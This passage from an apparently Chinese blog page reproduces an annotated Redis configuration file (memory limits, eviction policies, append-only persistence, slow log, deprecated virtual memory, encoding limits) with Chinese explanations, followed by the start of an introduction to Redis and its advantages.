reached错误信息</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">maxclients 128</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Don&#x27;</span>t use more memory than the specified amount of bytes.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">When the memory <span class="built_in">limit</span> is reached Redis will try to remove keys with an</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">EXPIRE <span class="built_in">set</span>. It will try to start freeing keys that are going to expire</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">in</span> little time and preserve keys with a longer time to live.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Redis will also try to remove objects from free lists <span class="keyword">if</span> possible.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># If all this fails, Redis will start to reply with errors to commands</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">that will use more memory, like SET, LPUSH, and so on, and will <span class="built_in">continue</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">to reply to most read-only commands like GET.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># WARNING: maxmemory can be a good idea mainly if you want to use Redis as a</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&#x27;state&#x27;</span> server or cache, not as a real DB. When Redis is used as a real</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">database the memory usage will grow over the weeks, it will be obvious <span class="keyword">if</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">it is going to use too much memory <span class="keyword">in</span> the long run, and you<span class="string">&#x27;ll have the time</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">to upgrade. With maxmemory after the limit is reached you&#x27;</span>ll start to get</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">errors <span class="keyword">for</span> write operations, and this may even lead to DB inconsistency.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Redis新的vm机制，会把Key存放内存，Value会存放在swap区</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">maxmemory &lt;bytes&gt;</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MAXMEMORY POLICY: how Redis will <span class="keyword">select</span> what to remove when maxmemory</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">is reached? You can <span class="keyword">select</span> among five behavior:</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># volatile-lru -&gt; remove the key with an expire set using an LRU algorithm</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">allkeys-lru -&gt; remove any key accordingly to the LRU algorithm</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">volatile-random -&gt; remove a random key with an expire <span class="built_in">set</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">allkeys-&gt;random -&gt; remove a random key, any key</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">volatile-ttl -&gt; remove the key with the nearest expire time (minor TTL)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">noeviction -&gt; don<span class="string">&#x27;t expire at all, just return an error on write operations</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># Note: with all the kind of policies, Redis will return an error on write</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">      operations, when there are not suitable keys for eviction.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash">#       At the date of writing this commands are: set setnx setex append</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">      incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">      sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">      zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">      getset mset msetnx exec sort</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># The default is:</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># maxmemory-policy volatile-lru</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">LRU and minimal TTL algorithms are not precise algorithms but approximated</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">algorithms (in order to save memory), so you can select as well the sample</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">size to check. For instance for default Redis will check three keys and</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">pick the one that was used less recently, you can change the sample size</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">using the following configuration directive.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># maxmemory-samples 3</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">############################# APPEND ONLY MODE ###############################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># Note that you can have both the async dumps and the append only file if you</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">like (you have to comment the &quot;save&quot; statements above to disable the dumps).</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Still if append only mode is enabled Redis will load the data from the</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">log file at startup ignoring the dump.rdb file.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">指定是否在每次更新操作后进行日志记录，Redis在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">因为redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为no</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">IMPORTANT: Check the BGREWRITEAOF to check how to rewrite the append</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">log file in background when it gets too big.</span></span></span><br><span class="line"> </span><br><span class="line">appendonly yes</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">指定更新日志文件名，默认为appendonly.aof</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">appendfilename appendonly.aof</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">The fsync() call tells the Operating System to actually write data on disk</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">instead to wait for more data in the output buffer. Some OS will really flush</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">data on disk, some other OS will just try to do it ASAP.</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">指定更新日志条件，共有3个可选值：</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">no:表示等操作系统进行数据缓存同步到磁盘（快）</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">always:表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全）</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">everysec:表示每秒同步一次（折衷，默认值）</span></span></span><br><span class="line"> </span><br><span class="line">appendfsync everysec</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">appendfsync no</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">When the AOF fsync policy is set to always or everysec, and a background</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">saving process (a background save or AOF log background rewriting) is</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">performing a lot of I/O against the disk, in some Linux configurations</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Redis may block too long on the fsync() call. Note that there is no fix for</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">this currently, as even performing fsync in a different thread will block</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">our synchronous write(2) call.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># In order to mitigate this problem it&#x27;</span>s possible to use the following option</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">that will prevent fsync() from being called <span class="keyword">in</span> the main process <span class="keyword">while</span> a</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">BGSAVE or BGREWRITEAOF is <span class="keyword">in</span> progress.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This means that while another child is saving the durability of Redis is</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the same as <span class="string">&quot;appendfsync none&quot;</span>, that <span class="keyword">in</span> pratical terms means that it is</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">possible to lost up to 30 seconds of <span class="built_in">log</span> <span class="keyword">in</span> the worst scenario (with the</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">default Linux settings).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;no&quot;</span> that is the safest pick from the point of view of durability.</span></span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Automatic rewrite of the append only file.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Redis is able to automatically rewrite the <span class="built_in">log</span> file implicitly calling</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">BGREWRITEAOF when the AOF <span class="built_in">log</span> size will growth by the specified percentage.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This is how it works: Redis remembers the size of the AOF file after the</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">latest rewrite (or <span class="keyword">if</span> no rewrite happened since the restart, the size of</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the AOF at startup is used).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This base size is compared to the current size. If the current size is</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bigger than the specified percentage, the rewrite is triggered. Also</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">you need to specify a minimal size <span class="keyword">for</span> the AOF file to be rewritten, this</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">is useful to avoid rewriting the AOF file even <span class="keyword">if</span> the percentage increase</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">is reached but it is still pretty small.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Specify a precentage of zero in order to disable the automatic AOF</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rewrite feature.</span></span><br><span class="line"> </span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">################################# SLOW LOG ###################################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The Redis Slow Log is a system to <span class="built_in">log</span> queries that exceeded a specified</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">execution time. The execution time does not include the I/O operations</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">like talking with the client, sending the reply and so forth,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">but just the time needed to actually execute the <span class="built_in">command</span> (this is the only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">stage of <span class="built_in">command</span> execution <span class="built_in">where</span> the thread is blocked and can not serve</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">other requests <span class="keyword">in</span> the meantime).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># You can configure the slow log with two parameters: one tells Redis</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">what is the execution time, <span class="keyword">in</span> microseconds, to exceed <span class="keyword">in</span> order <span class="keyword">for</span> the</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">command</span> to get logged, and the other parameter is the length of the</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">slow <span class="built_in">log</span>. When a new <span class="built_in">command</span> is logged the oldest one is removed from the</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">queue of logged commands.</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The following time is expressed <span class="keyword">in</span> microseconds, so 1000000 is equivalent</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">to one second. Note that a negative number disables the slow <span class="built_in">log</span>, <span class="keyword">while</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a value of zero forces the logging of every <span class="built_in">command</span>.</span></span><br><span class="line">slowlog-log-slower-than 10000</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">There is no <span class="built_in">limit</span> to this length. Just be aware that it will consume memory.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">You can reclaim memory used by the slow <span class="built_in">log</span> with SLOWLOG RESET.</span></span><br><span class="line">slowlog-max-len 1024</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">############################### VIRTUAL MEMORY ###############################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## WARNING! Virtual Memory is deprecated in Redis 2.4</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## The use of Virtual Memory is strongly discouraged.</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## WARNING! Virtual Memory is deprecated in Redis 2.4</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## The use of Virtual Memory is strongly discouraged.</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Virtual Memory allows Redis to work with datasets bigger than the actual</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">amount of RAM needed to hold the whole dataset <span class="keyword">in</span> memory.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">In order to <span class="keyword">do</span> so very used keys are taken <span class="keyword">in</span> memory <span class="keyword">while</span> the other keys</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">are swapped into a swap file, similarly to what operating systems <span class="keyword">do</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">with memory pages.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定是否启用虚拟内存机制，默认值为no，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VM机制将数据分页存放，由Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘自动换出到内存中</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把vm-enabled设置为<span class="built_in">yes</span>，根据需要设置好接下来的三个VM参数，就可以启动VM了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vm-enabled no</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vm-enabled <span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the path of the Redis swap file. As you can guess, swap files</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">can<span class="string">&#x27;t be shared by different Redis instances, so make sure to use a swap</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">file for every redis process you are running. Redis will complain if the</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">swap file is already in use.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># Redis交换文件最好的存储是SSD（固态硬盘）</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">*** WARNING *** if you are using a shared hosting the default of putting</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">the swap file under /tmp is not secure. Create a dir with access granted</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">only to Redis user and configure Redis to create the swap file there.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">vm-swap-file /tmp/redis.swap</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">With vm-max-memory 0 the system will swap everything it can. Not a good</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">default, just specify the max amount of RAM you can in bytes, but it&#x27;</span>s</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">better to leave some margin. For instance specify an amount of RAM</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">that<span class="string">&#x27;s more or less between 60 and 80% of your free RAM.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">将所有大于vm-max-memory的数据存入虚拟内存，无论vm-max-memory设置多少，所有索引数据都是内存存储的（Redis的索引数据就是keys）</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">也就是说当vm-max-memory设置为0的时候，其实是所有value都存在于磁盘。默认值为0</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">vm-max-memory 0</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Redis swap文件分成了很多的page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的数据大小来设定的。</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">建议如果存储很多小对象，page大小最后设置为32或64bytes；如果存储很大的对象，则可以使用更大的page，如果不确定，就使用默认值</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">vm-page-size 32</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">设置swap文件中的page数量由于页表（一种表示页面空闲或使用的bitmap）是存放在内存中的，在磁盘上每8个pages将消耗1byte的内存</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">swap空间总容量为 vm-page-size * vm-pages</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># With the default of 32-bytes memory pages and 134217728 pages Redis will</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">use a 4 GB swap file, that will use 16 MB of RAM for the page table.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># It&#x27;</span>s better to use the smallest acceptable value <span class="keyword">for</span> your application,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">but the default is large <span class="keyword">in</span> order to work <span class="keyword">in</span> most conditions.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vm-pages 134217728</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Max number of VM I/O threads running at the same time.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This threads are used to <span class="built_in">read</span>/write data from/to swap file, since they</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">also encode and decode objects from disk to memory or the reverse, a bigger</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">number of threads can <span class="built_in">help</span> with big objects even <span class="keyword">if</span> they can<span class="string">&#x27;t help with</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">I/O itself as the physical device may not be able to couple with many</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">reads/writes operations at the same time.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">设置访问swap文件的I/O线程数，最后不要超过机器的核数，如果设置为0，那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟，默认值为4</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">vm-max-threads 4</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">############################## ADVANCED CONFIG ###############################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Hashes are encoded in a special way (much more memory efficient) when they</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">have at max a given numer of elements, and the biggest element does not</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">exceed a given threshold. You can configure this limits with the following</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">configuration directives.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">hash-max-zipmap-entries 512</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">hash-max-zipmap-value 64</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Similarly to hashes, small lists are also encoded in a special way in order</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">to save a lot of space. The special representation is only used when</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">you are under the following limits:</span></span></span><br><span class="line">list-max-ziplist-entries 512</span><br><span class="line">list-max-ziplist-value 64</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Sets have a special encoding in just one case: when a set is composed</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">of just strings that happens to be integers in radix 10 in the range</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">of 64 bit signed integers.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">The following configuration setting sets the limit in the size of the</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">set in order to use this special memory saving encoding.</span></span></span><br><span class="line">set-max-intset-entries 512</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Similarly to hashes and lists, sorted sets are also specially encoded in</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">order to save a lot of space. This encoding is only used when the length and</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">elements of a sorted set are below the following limits:</span></span></span><br><span class="line">zset-max-ziplist-entries 128</span><br><span class="line">zset-max-ziplist-value 64</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">order to help rehashing the main Redis hash table (the one mapping top-level</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">keys to values). The hash table implementation redis uses (see dict.c)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">performs a lazy rehashing: the more operation you run into an hash table</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">that is rhashing, the more rehashing &quot;steps&quot; are performed, so if the</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">server is idle the rehashing is never complete and some more memory is used</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">by the hash table.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># The default is to use this millisecond 10 times every second in order to</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">active rehashing the main dictionaries, freeing memory when possible.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># If unsure:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">use &quot;activerehashing no&quot; if you have hard latency requirements and it is</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">not a good thing in your environment that Redis can reply form time to time</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">to queries with 2 milliseconds delay.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">指定是否激活重置哈希，默认为开启</span></span></span><br><span class="line">activerehashing yes</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">################################# INCLUDES ###################################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">指定包含其他的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各实例又拥有自己的特定配置文件</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">include /path/to/local.conf</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">include /path/to/other.conf</span></span></span><br></pre></td></tr></table></figure>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Redis 是完全开源的，遵守 BSD 协议，是一个高性能的 key-value 数据库。</p>
<p>Redis 与其他 key - value 缓存产品有以下三个特点：</p>
<ul>
<li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li>
<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>
<li>Redis支持数据的备份，即master-slave模式的数据备份。</li>
</ul>
<p>简单来说 redis 就是一个数据库，不过与传统数据库不同的是 redis 的数据是存在内存中的，所以读写速度非常快，因此 redis 被广泛应用于缓存方向。另外，redis 也经常用来做<a href="https://so.csdn.net/so/search?q=%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81&spm=1001.2101.3001.7020">分布式锁</a>。</p>
<h3 id="Redis-优势"><a href="#Redis-优势" class="headerlink" title="Redis 优势"></a>Redis 优势</h3><ul>
<li>性能极高 – Redis能读的速度是110000次&#x2F;s,写的速度是81000次&#x2F;s 。</li>
<li>丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。</li>
